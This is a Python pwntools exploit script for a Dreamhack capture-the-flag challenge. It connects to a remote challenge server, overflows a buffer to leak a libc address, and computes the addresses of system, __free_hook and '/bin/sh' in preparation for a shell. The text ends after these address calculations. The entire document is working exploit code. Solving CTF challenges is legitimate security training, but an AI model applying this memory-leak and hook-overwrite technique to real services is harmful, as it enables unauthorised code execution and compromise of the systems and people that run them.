#!/usr/bin/python3
from pwn import *
p = remote("host1.dreamhack.games", 8959)
libc = ELF("./libc.so.6") #libc-2.23

def slog(name, addr): return success(": ".join([name, hex(addr)]))
# [1] Leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1]+b"\x00"*2)
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 231)
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search("/bin/sh"))
slog("libc_base", libc_base)
slog("system", system)
slog("free_hook", free_hook)
slog("/bin/sh", binsh)
